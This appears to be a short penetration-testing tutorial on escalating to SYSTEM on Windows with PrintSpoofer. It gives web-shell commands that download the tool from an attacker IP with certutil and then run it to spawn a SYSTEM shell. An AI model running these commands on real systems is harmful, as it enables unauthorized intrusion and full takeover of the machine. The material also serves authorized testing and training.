
# Windows Privilege Escalation – PrintSpoofer

This document describes how to upload and execute **PrintSpoofer** to obtain a SYSTEM shell on a vulnerable Windows machine.

⚠️ For educational and authorized testing purposes only.

---

## Step 1: Upload PrintSpoofer using certutil

Use `certutil.exe` to download the binary from the attacker (Kali/Base) machine:

```text
cmd_shell.php?cmd=certutil.exe -urlcache -f http://192.168.49.52/printspoofer.exe PrintSpoofer32.exe
```

Ensure the binary is hosted on the attacker machine using a web server.

---

## Step 2: Execute PrintSpoofer

Run PrintSpoofer to spawn a SYSTEM command shell:

```text
cmd_shell.php?cmd=PrintSpoofer32.exe -i -c cmd.exe
```

If successful, a new command prompt will be executed with **NT AUTHORITY\SYSTEM** privileges.

---

## Notes
- Works when the **Print Spooler service** is enabled
- Requires **SeImpersonatePrivilege**
- Commonly effective on Windows Server and older Windows versions
- Antivirus or EDR may block PrintSpoofer binaries

---

## Outcome
Successful execution results in **privilege escalation from a low-privileged user to SYSTEM**.

---

## Disclaimer
Use this technique only on systems you own or have explicit permission to test.
